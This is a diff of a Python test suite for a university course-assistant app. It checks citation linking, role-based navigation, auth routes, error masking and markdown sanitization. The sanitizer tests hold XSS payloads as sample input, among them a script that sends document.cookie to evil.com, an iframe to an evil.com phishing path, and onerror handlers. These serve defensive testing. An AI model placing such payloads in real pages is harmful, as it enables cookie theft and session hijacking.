-    def test_course_summaries_endpoint_and_dto(self) -> None:
-        """Verify course summaries endpoint returns aggregated document counts and previews without N+1."""
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-
-        # Create a course and upload a document to verify summary calculation
-        course_name = f"Summary Course {uuid.uuid4().hex[:6]}"
-        course = client.create_knowledge_base(course_name, "Testing summary endpoint")
-
-        pdf_bytes = create_sample_pdf_bytes()
-        _ = client.upload_document(
-            kb_id=course.id,
-            filename="syllabus_2026.pdf",
-            content=pdf_bytes,
-        )
-
-        summaries = client.get_course_summaries()
-        assert len(summaries) >= 1
-        target_summary = next((s for s in summaries if s.id == course.id), None)
-        assert target_summary is not None
-        assert target_summary.name == course_name
-        assert target_summary.total_documents >= 1
-        assert target_summary.active_documents >= 1
-        assert target_summary.inactive_documents == 0
-        assert len(target_summary.document_previews) >= 1
-        assert target_summary.document_previews[0].filename == "syllabus_2026.pdf"
-        assert target_summary.document_previews[0].is_active is True
-
-    def test_admin_list_dto_fields(self) -> None:
-        """Verify get_admins returns DTOs with all required identity fields."""
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-
-        admins = client.get_admins()
-        assert len(admins) >= 1
-        admin = admins[0]
-        assert admin.full_name is not None and len(admin.full_name) > 0
-        assert admin.email is not None and "@" in admin.email
-        assert admin.role == "ADMIN"
-        assert admin.is_active is True
-        assert admin.created_at is not None
-
-    def test_no_obsolete_active_corpus_strings_in_frontend(self) -> None:
-        """Verify obsolete active-corpus UI strings have been completely removed from frontend pages."""
-        from pathlib import Path
-
-        pages_to_check = [
-            Path("frontend/pages/documents_page.py"),
-            Path("frontend/pages/knowledge_bases_page.py"),
-            Path("frontend/pages/dashboard_page.py"),
-            Path("frontend/components/layout.py"),
+        assert state.is_generating is False
+        assert state.generation_error is None
+
+    def test_app_state_per_session_isolation(self) -> None:
+        _session_app_states.clear()
+        req1 = Request({"type": "http", "method": "GET", "path": "/", "session": {"id": "session-1"}})
+        req2 = Request({"type": "http", "method": "GET", "path": "/", "session": {"id": "session-2"}})
+
+        request_contextvar.set(req1)
+        state1 = AppState()
+        state1.add_user_message("User 1 question")
+
+        request_contextvar.set(req2)
+        state2 = AppState()
+        assert len(state2.chat_history) == 0
+
+        request_contextvar.set(req1)
+        assert len(state1.chat_history) == 1
+
+        request_contextvar.set(None)
+
+    def test_app_state_is_admin_property(self) -> None:
+        from frontend.client.api_client import api_client
+
+        api_client.logout()
+        state = AppState()
+        assert state.is_admin is False
+
+        api_client.login("admin@university.edu", "AdminPass123!")
+        assert state.is_admin is True
+
+        api_client.logout()
+        assert state.is_admin is False
+
+
+# ==============================================================================
+# C. CITATION PROCESSING CONTRACTS
+# ==============================================================================
+
+
+class TestCitationProcessingContracts:
+    """Test suite validating semantic citation linking, safety, and markdown integrity."""
+
+    @pytest.fixture
+    def sample_citations(self) -> list[CitationDTO]:
+        return [
+            CitationDTO(
+                document_id="doc-uuid-1",
+                document_name="KSU-Act-English.pdf",
+                page_number=12,
+                chunk_id="chunk-1",
+                snippet="Powers of the Governing Board under Section 12.",
+                relevance_score=0.95,
+                knowledge_base_id="kb-uuid-1",
+                course_name="BCA Regulations",
+            ),
+            CitationDTO(
+                document_id="doc-uuid-2",
+                document_name="Syllabus-2026.pdf",
+                page_number=45,
+                chunk_id="chunk-2",
+                snippet="Grading policy requires passing marks in theory and practicals.",
+                relevance_score=0.91,
+                knowledge_base_id="kb-uuid-1",
+                course_name="BCA Regulations",
+            ),
         ]
 
-        forbidden_phrases = [
-            "Active Target Corpus",
-            "ACTIVE TARGET CORPUS",
-            "Set Active",
-            "Chat with Corpus",
-            "Active Course Scope",
-            "Active Scope Documents",
-            "ACTIVE COURSE / KB",
-        ]
+    def test_citation_mapping_numeric_bracket(self, sample_citations) -> None:
+        text = "As stated in the act [1]."
+        res = format_citation_links(text, sample_citations)
+        assert 'data-citation-index="1"' in res
+        assert "KSU-Act-English.pdf" in res
 
-        for file_path in pages_to_check:
-            content = file_path.read_text(encoding="utf-8")
-            for phrase in forbidden_phrases:
-                assert phrase not in content, f"Found obsolete phrase '{phrase}' in {file_path}"
+    def test_citation_mapping_source_bracket(self, sample_citations) -> None:
+        text = "As stated in the act [source_1]."
+        res = format_citation_links(text, sample_citations)
+        assert 'data-citation-index="1"' in res
+        assert "KSU-Act-English.pdf" in res
 
-    def test_cleanup_dev_test_data_safety_guards(self) -> None:
-        """Verify cleanup script refuses test database and protects legitimate courses."""
-        from scripts.cleanup_dev_test_data import (
-            PROTECTED_COURSE_NAMES,
-            verify_database_safety,
-        )
+    def test_citation_mapping_multiple_citations(self, sample_citations) -> None:
+        text = "Refer to the board powers [1] and the grading policy [2]."
+        res = format_citation_links(text, sample_citations)
+        assert 'data-citation-index="1"' in res
+        assert 'data-citation-index="2"' in res
+        assert "KSU-Act-English.pdf" in res
+        assert "Syllabus-2026.pdf" in res
 
-        # Rejects test database
-        with pytest.raises(SystemExit):
-            verify_database_safety(
-                "postgresql+psycopg://user:pass@localhost:5432/rag_assistant_test_db"
+    def test_citation_invalid_reference_preserved_as_text(self, sample_citations) -> None:
+        text = "Unavailable citations [99] and [source_99] should not crash."
+        res = format_citation_links(text, sample_citations)
+        assert "[99]" in res
+        assert "[source_99]" in res
+
+    def test_citation_does_not_corrupt_standard_markdown_links(self, sample_citations) -> None:
+        text = "According to [1], visit [University Portal](https://university.edu) for details."
+        res = format_citation_links(text, sample_citations)
+        assert 'data-citation-index="1"' in res
+        assert "[University Portal](https://university.edu)" in res
+
+    def test_citation_output_contains_no_session_tokens(self, sample_citations) -> None:
+        text = "Document reference [1]."
+        res = format_citation_links(text, sample_citations)
+        assert "token=" not in res
+        assert "auth_session_token" not in res
+        assert "cookie" not in res
+
+    def test_citation_metadata_html_escaping(self) -> None:
+        malicious_citations = [
+            CitationDTO(
+                document_id="doc-malicious",
+                document_name='"><script>alert(1)</script>.pdf',
+                page_number=1,
+                chunk_id="chunk-malicious",
+                snippet='"><img src=x onerror="alert(\'xss\')">',
+                relevance_score=0.9,
             )
-
-        # Rejects arbitrary database
-        with pytest.raises(SystemExit):
-            verify_database_safety("postgresql+psycopg://user:pass@localhost:5432/production_db")
-
-        # Protected course names contain legitimate courses
-        assert "computer architecture" in PROTECTED_COURSE_NAMES
-        assert "official university regulations" in PROTECTED_COURSE_NAMES
-        assert "bca" in PROTECTED_COURSE_NAMES
+        ]
+        text = "Check this source [1]."
+        res = format_citation_links(text, malicious_citations)
+        assert "<script>" not in res
+        assert 'onerror="alert' not in res
+        assert html.escape('"><script>alert(1)</script>.pdf') in res or "&lt;script&gt;" in res
 
 
-class TestStep22AAuthExperience:
-    """Unit tests for Step 22A: Authentication & Entry Experience."""
+# ==============================================================================
+# D. MARKDOWN / OUTPUT SECURITY CONTRACTS
+# ==============================================================================
 
-    def test_auth_pages_register_all_portal_routes(self) -> None:
-        """Verify register_auth_pages registers /login, /student/login, /admin/login, /register."""
-        from nicegui import app
 
+class TestMarkdownOutputSecurityContracts:
+    """Test suite validating client-side HTML output sanitization and error masking."""
+
+    def test_markdown_sanitizer_preserves_valid_markdown(self) -> None:
+        normal = "**Bold statement** with *italics* and `inline_code()`.\n- Item 1\n- Item 2"
+        assert sanitize_markdown_text(normal) == normal
+
+    def test_markdown_sanitizer_neutralizes_script_tags(self) -> None:
+        dangerous = "Answer: <script>window.location='http://evil.com?c='+document.cookie;</script>"
+        sanitized = sanitize_markdown_text(dangerous)
+        assert "<script>" not in sanitized
+        assert "window.location" not in sanitized
+
+    def test_markdown_sanitizer_neutralizes_iframes(self) -> None:
+        dangerous = 'Information: <iframe src="http://evil.com/phish"></iframe>'
+        sanitized = sanitize_markdown_text(dangerous)
+        assert "<iframe" not in sanitized
+
+    def test_markdown_sanitizer_neutralizes_event_handlers(self) -> None:
+        dangerous = '<img src="missing.png" onerror="alert(document.cookie)">'
+        sanitized = sanitize_markdown_text(dangerous)
+        assert "onerror=" not in sanitized
+
+    def test_error_normalizer_suppresses_sql_and_tracebacks(self) -> None:
+        raw_sql_error = (
+            "psycopg.errors.SyntaxError: syntax error at or near 'SELECT'\n"
+            "LINE 1: SELECT * FROM credentials WHERE token='secret_abc';\n"
+            "Traceback (most recent call last):\n"
+            '  File "db.py", line 42, in execute\n'
+        )
+        normalized = normalize_error(raw_sql_error)
+        assert "server processing error" in normalized.lower()
+        assert "SELECT" not in normalized
+        assert "secret_abc" not in normalized
+        assert "Traceback" not in normalized
+
+    def test_error_normalizer_contextual_messages(self) -> None:
+        assert "invalid email or password" in normalize_error(401, context="auth").lower()
+        assert "already exists" in normalize_error("AUTH_EMAIL_EXISTS", context="auth").lower()
+        assert "size" in normalize_error(413, context="document").lower()
+        assert "format" in normalize_error(415, context="document").lower()
+
+
+# ==============================================================================
+# E. NAVIGATION AND ACCESS SEMANTICS CONTRACTS
+# ==============================================================================
+
+
+class TestNavigationAccessContracts:
+    """Test suite validating navigation availability by route path and role authorization."""
+
+    def test_navigation_unauthenticated_returns_empty_items(self) -> None:
+        assert get_nav_items(None) == []
+
+    def test_navigation_student_routes(self) -> None:
+        student = UserDTO(
+            id="s-100",
+            email="student@univ.edu",
+            full_name="Enrolled Student",
+            role="STUDENT",
+        )
+        items = get_nav_items(student)
+        routes = [route for _, route, _ in items]
+
+        # Allowed student routes
+        assert "/dashboard" in routes
+        assert "/knowledge-bases" in routes
+        assert "/chat" in routes
+        assert "/profile" in routes
+
+        # Prohibited administrator routes
+        assert "/documents" not in routes
+        assert "/administrators" not in routes
+        assert "/system-health" not in routes
+
+    def test_navigation_admin_routes(self) -> None:
+        admin = UserDTO(
+            id="a-100",
+            email="admin@univ.edu",
+            full_name="Administrator",
+            role="ADMIN",
+            admin_role="MAIN_ADMIN",
+        )
+        items = get_nav_items(admin)
+        routes = [route for _, route, _ in items]
+
+        assert "/dashboard" in routes
+        assert "/knowledge-bases" in routes
+        assert "/documents" in routes
+        assert "/chat" in routes
+        assert "/profile" in routes
+
+    def test_navigation_faculty_admin_chat_permission_scope(self) -> None:
+        # Faculty admin without chat permission
+        faculty_without_chat = UserDTO(
+            id="fa-1",
+            email="faculty1@univ.edu",
+            full_name="Faculty One",
+            role="ADMIN",
+            admin_role="FACULTY_ADMIN",
+            permissions=[Permission.DOCUMENT_VIEW.value],
+        )
+        routes_without = [route for _, route, _ in get_nav_items(faculty_without_chat)]
+        assert "/chat" not in routes_without
+        assert has_admin_permission(faculty_without_chat, Permission.ADMIN_CHAT) is False
+
+        # Faculty admin with chat permission
+        faculty_with_chat = faculty_without_chat.model_copy(
+            update={
+                "permissions": [
+                    Permission.DOCUMENT_VIEW.value,
+                    Permission.ADMIN_CHAT.value,
+                ]
+            }
+        )
+        routes_with = [route for _, route, _ in get_nav_items(faculty_with_chat)]
+        assert "/chat" in routes_with
+        assert has_admin_permission(faculty_with_chat, Permission.ADMIN_CHAT) is True
+
+    def test_protected_page_routes_registered(self) -> None:
+        init_ui()
+        registered_paths = [r.path for r in nicegui_app.routes if hasattr(r, "path")]
+
+        expected_routes = [
+            "/",
+            "/login",
+            "/student/login",
+            "/admin/login",
+            "/register",
+            "/dashboard",
+            "/knowledge-bases",
+            "/chat",
+            "/documents",
+            "/profile",
+        ]
+        for route in expected_routes:
+            assert route in registered_paths, f"Expected route {route} not registered"
+
+
+# ==============================================================================
+# F. AUTHENTICATION PAGE CONTRACTS
+# ==============================================================================
+
+
+class TestAuthPageContracts:
+    """Test suite validating authentication portal endpoints and server-side role gating."""
+
+    def test_auth_routes_registration(self) -> None:
         from frontend.pages.auth_pages import register_auth_pages
 
         register_auth_pages()
-        registered_paths = [r.path for r in app.routes if hasattr(r, "path")]
-        assert "/login" in registered_paths
-        assert "/student/login" in registered_paths
-        assert "/admin/login" in registered_paths
-        assert "/register" in registered_paths
+        registered = [r.path for r in nicegui_app.routes if hasattr(r, "path")]
+        assert "/login" in registered
+        assert "/student/login" in registered
+        assert "/admin/login" in registered
+        assert "/register" in registered
 
     def test_api_client_has_portal_methods(self) -> None:
-        """Verify FrontendAPIClient and proxy provide student_login and admin_login."""
-        from frontend.client.api_client import api_client
+        client = FrontendAPIClient()
+        assert hasattr(client, "student_login")
+        assert callable(client.student_login)
+        assert hasattr(client, "admin_login")
+        assert callable(client.admin_login)
 
-        assert hasattr(api_client, "student_login")
-        assert callable(api_client.student_login)
-        assert hasattr(api_client, "admin_login")
-        assert callable(api_client.admin_login)
-
-    def test_auth_pages_file_content_security_checks(self) -> None:
-        """Verify no public administrator registration exists in auth pages."""
-        from pathlib import Path
-
-        auth_page_path = Path("frontend/pages/auth_pages.py")
-        content = auth_page_path.read_text(encoding="utf-8")
-
-        # Must not contain administrator registration links or forms
-        assert "Create Administrator Account" not in content
-        assert "Register Administrator" not in content
-        assert "admin_register" not in content
-
-        # Must contain distinct portal branding and links
-        assert "Student Portal" in content
-        assert "Administrator Portal" in content
-        assert "/student/login" in content
-        assert "/admin/login" in content
-        assert "/register" in content
-
-    def test_wrong_portal_error_normalization_preserves_guidance(self) -> None:
-        """Verify directional guidance messages are cleanly passed through error normalizer."""
-        from frontend.client.error_handler import normalize_error
-
-        admin_wrong = (
+    def test_wrong_portal_directional_guidance(self) -> None:
+        admin_guidance = (
             "This account belongs to the Administrator Portal. Please use Administrator Sign In."
         )
-        student_wrong = (
+        student_guidance = (
             "This account does not have administrator access. Please use Student Sign In."
         )
 
-        assert normalize_error(admin_wrong, context="auth") == admin_wrong
-        assert normalize_error(student_wrong, context="auth") == student_wrong
-        assert normalize_error({"detail": admin_wrong}, context="auth") == admin_wrong
-        assert normalize_error({"detail": student_wrong}, context="auth") == student_wrong
+        assert normalize_error(admin_guidance, context="auth") == admin_guidance
+        assert normalize_error(student_guidance, context="auth") == student_guidance
+        assert normalize_error({"detail": admin_guidance}, context="auth") == admin_guidance
+        assert normalize_error({"detail": student_guidance}, context="auth") == student_guidance
 
+    def test_registration_is_strictly_student(self) -> None:
+        client = FrontendAPIClient()
+        unique_email = f"student_check_{uuid.uuid4().hex[:6]}@univ.edu"
+        user = client.register(unique_email, "StudentPass123!", "Strict Student")
 
-class TestStep22BAuthVisualRefinement:
-    """Unit tests for Step 22B: Authentication UI Visual Refinement."""
-
-    def test_auth_layout_available_and_distinct_from_page_layout(self) -> None:
-        """Verify auth_layout exists and provides clean header without global auth buttons."""
-        from frontend.components.layout import auth_layout
-
-        assert callable(auth_layout)
-
-    def test_auth_pages_use_auth_layout_not_page_layout(self) -> None:
-        """Verify auth_pages.py uses auth_layout for all entry points, eliminating redundant navbar buttons."""
-        from pathlib import Path
-
-        auth_page_path = Path("frontend/pages/auth_pages.py")
-        content = auth_page_path.read_text(encoding="utf-8")
-
-        assert "with auth_layout(" in content
-        # Ensure page_layout is not used on authentication screens
-        assert "with page_layout(" not in content
-
-    def test_auth_cards_have_box_border_and_max_width_guards(self) -> None:
-        """Verify auth cards enforce box-border and mobile-safe widths to avoid horizontal overflow."""
-        from pathlib import Path
-
-        auth_page_path = Path("frontend/pages/auth_pages.py")
-        content = auth_page_path.read_text(encoding="utf-8")
-
-        assert "box-border" in content
-        assert "max-w-[440px]" in content
-        # Back navigation exists with proper target
-        assert "_render_back_to_portals" in content
-        assert 'ui.icon("arrow_back"' in content
-
-    def test_role_accent_distinction_preserved(self) -> None:
-        """Verify student portal uses academic blue and administrator portal uses institutional slate."""
-        from pathlib import Path
-
-        auth_page_path = Path("frontend/pages/auth_pages.py")
-        content = auth_page_path.read_text(encoding="utf-8")
-
-        assert "text-blue-700" in content
-        assert "!bg-blue-700" in content
-        assert "!bg-slate-800" in content
-
-    def test_registration_page_is_strictly_student(self) -> None:
-        """Verify registration form strictly contains student fields with no admin role option."""
-        from pathlib import Path
-
-        auth_page_path = Path("frontend/pages/auth_pages.py")
-        content = auth_page_path.read_text(encoding="utf-8")
-
-        assert "Create Student Account" in content
-        assert "student@university.edu" in content
-        assert "Full Name" in content
-        assert "Password must be at least 8 characters." in content
-        assert "Administrator accounts are provisioned internally." in content
+        assert user.role == "STUDENT"
+        assert getattr(user, "admin_role", None) is None
